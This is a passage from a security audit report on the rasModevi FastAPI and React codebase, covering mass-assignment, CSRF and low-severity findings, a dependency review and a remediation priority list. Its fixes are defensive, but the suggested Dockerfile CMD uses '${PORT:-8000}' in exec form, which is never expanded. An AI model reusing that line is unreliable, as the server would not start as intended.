
**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
**File:** `/home/fernando/Projects/rasModevi/backend/routers/developer.py` lines 208-213
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The app update endpoint uses `model_dump(exclude_none=True)` with `setattr` to apply all provided fields:
```python
for field, value in body.model_dump(exclude_none=True).items():
    setattr(app, field, value)
```

While the `StoreAppUpdate` schema currently only has safe fields, if new fields are added to the schema without considering this pattern, they could be exploited. The `SensorUpdate` schema in `hardware.py` (line 59) uses the same pattern.

**Remediation:**
Explicitly enumerate allowed fields:
```python
UPDATABLE_FIELDS = {"name", "description", "long_description", "category_id", "version"}
for field, value in body.model_dump(exclude_none=True).items():
    if field in UPDATABLE_FIELDS:
        setattr(app, field, value)
```

---

### M7: No CSRF Protection for State-Changing Operations

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-352 (Cross-Site Request Forgery)
**Files:** All routers with POST/PUT/DELETE endpoints
**OWASP:** A01:2021 -- Broken Access Control

**Description:**
The application relies solely on JWT Bearer tokens for authentication with no CSRF tokens. While Bearer tokens in Authorization headers are generally CSRF-resistant (browsers do not automatically include custom headers), the combination of:
1. Wildcard CORS (C5) allowing any origin to set custom headers
2. JWT in query params for SSE (H1)
3. Potential future cookie-based auth

...creates a CSRF risk surface.

**Remediation:**
Fix the CORS configuration (C5) as the primary mitigation. If cookies are adopted (H8 remediation), add CSRF tokens with `SameSite=Strict`.

---

## Low Findings

### L1: `python-jose` Library Has Known Vulnerabilities

**Severity:** Low (CVSS 3.7)
**CWE:** CWE-1035 (OWASP Top Ten 2017 - Using Components with Known Vulnerabilities)
**File:** `/home/fernando/Projects/rasModevi/backend/requirements.txt` line 8
**OWASP:** A06:2021 -- Vulnerable and Outdated Components

**Description:**
`python-jose==3.3.0` (installed as 3.5.0) is no longer actively maintained. The library has had historical JWT algorithm confusion vulnerabilities. The `Requires: ecdsa, pyasn1, rsa` output shows it is using the pure-Python cryptography backends rather than the more secure `cryptography` library backend.

`passlib==1.7.4` is also unmaintained since 2020 and has compatibility warnings with newer Python versions.

**Remediation:**
Migrate to `PyJWT` (actively maintained) with the `cryptography` backend:
```
pip install PyJWT[crypto]
```

---

### L2: Debug/Development Information in Production

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-215 (Insertion of Sensitive Information Into Debugging Code)
**File:** `/home/fernando/Projects/rasModevi/backend/seed.py` line 216

**Description:**
The seed function prints "Database seeded successfully." to stdout on every startup, including production. While minor, this confirms the seeding process (and thus the existence of default accounts) in logs.

**Remediation:**
Use a logger with configurable levels instead of `print`:
```python
import logging
log = logging.getLogger(__name__)
log.info("Database seeded successfully.")
```

---

### L3: No Password Complexity Requirements

**Severity:** Low (CVSS 3.7)
**CWE:** CWE-521 (Weak Password Requirements)
**File:** `/home/fernando/Projects/rasModevi/backend/schemas.py` line 18
**OWASP:** A07:2021 -- Identification and Authentication Failures

**Description:**
The `UserCreate` schema only enforces `min_length=6` for passwords. There are no requirements for character complexity (uppercase, lowercase, digits, special characters) or checks against common password lists.

**Remediation:**
```python
@field_validator("password")
@classmethod
def validate_password(cls, v: str) -> str:
    if len(v) < 8:
        raise ValueError("Password must be at least 8 characters")
    if not any(c.isupper() for c in v):
        raise ValueError("Password must contain at least one uppercase letter")
    if not any(c.isdigit() for c in v):
        raise ValueError("Password must contain at least one digit")
    return v
```

---

### L4: Email Field Not Validated as Email Format

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-20 (Improper Input Validation)
**File:** `/home/fernando/Projects/rasModevi/backend/schemas.py` line 17

**Description:**
The `UserCreate` schema defines `email: str` without using Pydantic's `EmailStr` validator. Any string is accepted as an email address. The `EmailStr` import exists on line 7 but is not used for the field.

**Remediation:**
```python
class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: EmailStr  # Use EmailStr instead of str
    password: str = Field(..., min_length=6)
    role: str = "user"
```

---

### L5: Uvicorn Running Without Production Hardening

**Severity:** Low (CVSS 2.0)
**CWE:** CWE-16 (Configuration)
**Files:**
- `/home/fernando/Projects/rasModevi/backend/main.py` line 210
- `/home/fernando/Projects/rasModevi/Dockerfile` line 22

**Description:**
Uvicorn is run directly without:
- Worker process management (gunicorn with uvicorn workers)
- SSL/TLS termination configuration
- Access log formatting for security monitoring
- Request size limits
- Timeout configuration

On the Pi, it binds to `0.0.0.0:8000` which accepts connections on all interfaces.

**Remediation:**
Use gunicorn with uvicorn workers in production:
```dockerfile
CMD ["gunicorn", "main_store:app", "-w", "4", "-k", "uvicorn.workers.UvicornWorker", "--bind", "0.0.0.0:${PORT:-8000}", "--timeout", "120", "--limit-request-line", "8190"]
```

---

## Dependency Analysis

| Package | Version | Status | Notes |
|---------|---------|--------|-------|
| `python-jose[cryptography]` | 3.3.0 (installed 3.5.0) | **Unmaintained** | Migrate to `PyJWT`. Known algorithm confusion issues in older versions. |
| `passlib[bcrypt]` | 1.7.4 | **Unmaintained** | Last release 2020. Compatibility warnings with Python 3.12+. Consider `bcrypt` directly. |
| `fastapi` | 0.135.1 | Current | No known issues. |
| `sqlalchemy` | 2.0.48 | Current | No known issues. |
| `uvicorn` | 0.41.0 | Current | No known issues. |
| `anthropic` | >=0.40.0 | Current | No known issues. |
| `httpx` | >=0.27.0 | Current | No known issues. |
| `boto3` | >=1.34.0 | Current | No known issues. |
| `psutil` | 7.0.0 | Current | No known issues. |
| `bcrypt` | 4.2.0 | Current | No known issues. |
| `pymysql` | 1.1.1 | Current | No known issues. |
| `smbus2` | >=0.4.0 | Current | No known issues. |

---

## Remediation Priority Matrix

| Priority | ID | Finding | Effort | Impact |
|----------|----|---------|--------|--------|
| **P0 - Immediate** | C2 | Unauthenticated hardware/SDK endpoints | Medium | **Critical** -- Active internet exposure of hardware controls |
| **P0 - Immediate** | C1 | Arbitrary SQL execution | Low | **Critical** -- Full DB read/write via public endpoint |
| **P0 - Immediate** | C5 | Wildcard CORS | Low | **Critical** -- Enables cross-origin exploitation |
| **P1 - This week** | C3 | Zip Slip path traversal | Low | **Critical** -- Arbitrary file write |
| **P1 - This week** | C4 | Admin role self-assignment | Low | **Critical** -- Privilege escalation |
| **P1 - This week** | C6 | require_developer not enforcing role | Low | **Critical** -- Authorization bypass |
| **P1 - This week** | H2 | Hardcoded credentials | Low | **High** -- Known admin passwords |
| **P1 - This week** | H5 | Iframe sandbox escape | Medium | **High** -- Token theft by malicious apps |
| **P2 - This sprint** | H1 | JWT in URL query params | Medium | **High** -- Token leakage |
| **P2 - This sprint** | H3 | No rate limiting | Medium | **High** -- Brute-force attacks |
| **P2 - This sprint** | H4 | Missing security headers | Low | **High** -- Defense-in-depth gap |
| **P2 - This sprint** | H6 | No GPIO pin validation | Low | **High** -- Hardware safety |
| **P2 - This sprint** | H7 | Path traversal in serve_frontend | Low | **High** -- File access |
| **P2 - This sprint** | H8 | JWT in localStorage | Medium | **High** -- Token theft vector |
| **P3 - Next sprint** | M1-M7 | All medium findings | Various | **Medium** |
| **P4 - Backlog** | L1-L5 | All low findings | Various | **Low** |

---

## Summary of Changes Required

### Backend files requiring modification:

1. **`/home/fernando/Projects/rasModevi/backend/auth.py`** -- Fix `require_developer` role check (C6)
2. **`/home/fernando/Projects/rasModevi/backend/routers/auth.py`** -- Force role to user/developer only (C4), add rate limiting (H3)
3. **`/home/fernando/Projects/rasModevi/backend/routers/sdk.py`** -- Add authentication (C2), SQL validation/authorizer (C1), pin validation (H6)
4. **`/home/fernando/Projects/rasModevi/backend/routers/hardware.py`** -- Add authentication (C2), pin validation (H6)
5. **`/home/fernando/Projects/rasModevi/backend/routers/system.py`** -- Add authentication (C2)
6. **`/home/fernando/Projects/rasModevi/backend/routers/device.py`** -- Safe ZIP extraction (C3)
7. **`/home/fernando/Projects/rasModevi/backend/routers/ai.py`** -- Safe ZIP extraction (C3), input length limits (M5), SSE ticket pattern (H1)
8. **`/home/fernando/Projects/rasModevi/backend/main.py`** -- Fix CORS (C5), add security headers (H4), fix serve_frontend (H7)
9. **`/home/fernando/Projects/rasModevi/backend/main_store.py`** -- Fix CORS (C5), add security headers (H4), fix serve_frontend (H7)
10. **`/home/fernando/Projects/rasModevi/backend/schemas.py`** -- Fix UserCreate role validator (C4), add password validation (L3), use EmailStr (L4)
11. **`/home/fernando/Projects/rasModevi/backend/seed.py`** -- Remove hardcoded passwords (H2)
12. **`/home/fernando/Projects/rasModevi/backend/requirements.txt`** -- Replace python-jose with PyJWT (L1)

### Frontend files requiring modification:

13. **`/home/fernando/Projects/rasModevi/frontend/src/pages/AppRunnerPage.jsx`** -- Fix iframe sandbox (H5)
14. **`/home/fernando/Projects/rasModevi/frontend/src/context/AuthContext.jsx`** -- Move tokens to HTTP-only cookies (H8)
15. **`/home/fernando/Projects/rasModevi/frontend/src/api/client.js`** -- Adapt to cookie-based auth (H8)

---

*This audit was conducted through static code analysis. Dynamic testing (penetration testing) would be recommended to validate these findings and uncover additional runtime vulnerabilities. The findings documented here represent the state of the codebase as of the git commit `9ed6d7c` on the `main` branch.*
